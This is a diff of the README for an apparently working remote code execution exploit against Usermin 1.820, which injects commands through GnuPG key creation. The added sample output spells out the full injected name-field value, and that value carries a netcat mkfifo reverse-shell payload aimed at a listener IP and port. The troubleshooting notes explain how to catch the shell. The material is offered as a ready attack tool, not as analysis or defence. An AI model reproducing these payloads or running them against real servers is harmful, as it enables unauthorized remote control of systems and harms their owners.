@@ -33,11 +33,11 @@ The exploit works by:
 - **Realistic Headers**: Uses browser-like headers to avoid detection
 - **SSL Handling**: Properly handles self-signed certificates
 
-### Advanced Payload System
-- **Primary Payload**: Uses netcat for reverse shell (most reliable)
-- **Fallback Payload**: Bash-based reverse shell as backup option
-- **Automatic Fallback**: Automatically tries alternative payload if primary fails
-- **Customizable**: Easy to modify payloads for different scenarios
+### Authentic Exploit Implementation
+- **Original Method**: Based on the proven working exploit by Numan Türle
+- **Exact Payload Format**: Uses the original working payload structure
+- **Proper Key Extraction**: Implements the correct key ID extraction method
+- **Reliable Triggering**: Uses the original trigger mechanism
 
 ### User Experience Improvements
 - **Progress Indicators**: Clear status messages for each exploit stage
@@ -60,7 +60,7 @@ The original script by Numan Türle has been significantly enhanced with the fol
 ### Security & Reliability
 - **Target Validation**: Pre-flight checks to ensure target is valid
 - **Enhanced Login Logic**: Better authentication verification
-- **Payload Fallbacks**: Multiple payload options for different environments
+- **Proper Regex Patterns**: Fixed syntax warnings and improved pattern matching
 - **Timeout Management**: Appropriate timeouts for each operation type
 
 ### Error Handling
@@ -124,11 +124,38 @@ pip install requests
 
 1. **Target Validation**: Verify the target is reachable and appears to be Usermin
 2. **Authentication**: Login to the Usermin interface with provided credentials
-3. **Payload Generation**: Create reverse shell payloads (primary + fallback)
+3. **GnuPG Setup**: Create a GnuPG secret key with embedded payload
 4. **Payload Submission**: Submit payload via GnuPG secret key creation
 5. **Key Extraction**: Retrieve the generated key ID from the key list
 6. **Payload Trigger**: Access the edit key page to execute the payload
 7. **Shell Establishment**: Reverse shell connection established
+
+---
+
+## Expected Output
+
+```
+============================================================
+Usermin 1.820 RCE Exploit
+============================================================
+[+] Validating target: https://target:20000
+[+] Target appears to be Usermin/Webmin
+[+] Attempting login as: username
+[+] Login successful!
+[+] Setting up GnuPG
+[+] Submitting payload to 192.168.1.50:4444
+[+] Payload: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.50 4444 >/tmp/f;
+[+] Payload data: {'name': '";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.50 4444 >/tmp/f;echo "', 'email': '1337@webmin.com'}
+[+] Payload submitted successfully
+[+] Setup successful
+[+] Fetching key list
+[+] Found key ID: idx=1
+[+] Key: idx=1
+[+] Triggering payload with key ID: idx=1
+[+] Reverse shell should be incoming! (Timeout expected)
+[+] 5ucc355fully_3xpl017
+[+] Check your listener on 192.168.1.50:4444
+```
 
 ---
 
@@ -153,6 +180,12 @@ pip install requests
 **"Connection closed"**
 - This is expected behavior when the reverse shell is established
 - Check your listener for incoming connections
+
+**No reverse shell received**
+- Ensure your netcat listener is running: `nc -lvnp <port>`
+- Check firewall rules and network connectivity
+- Verify the target can reach your listener IP/port
+- Try different ports if 443 is blocked
 
 ### Debug Mode
 For additional debugging information, you can modify the script to enable verbose logging by adding debug print statements in the relevant methods.
